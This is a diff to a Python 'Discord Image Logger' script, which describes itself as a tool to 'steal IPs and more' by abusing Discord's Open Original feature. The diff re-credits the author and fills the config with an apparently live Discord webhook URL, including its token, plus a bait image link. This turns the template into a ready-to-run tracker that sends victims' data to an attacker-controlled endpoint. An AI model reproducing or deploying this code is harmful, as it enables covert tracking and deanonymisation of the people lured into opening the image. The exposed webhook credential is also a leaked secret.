@@ -1,5 +1,5 @@
 # Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+# By sensifi-studios | https://github.com/sensifi-studios
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -8,12 +8,12 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "sensifi-studios"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1345934467348561951/tBddEY-GeBLmRm5bFHmRGZWZqyVFhppKxly_s6WiBYYxCrkyf4LevORRWFBFlymjKpWN",
+    "image": "https://photosrush.com/wp-content/uploads/alien-cat-pfp-1.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
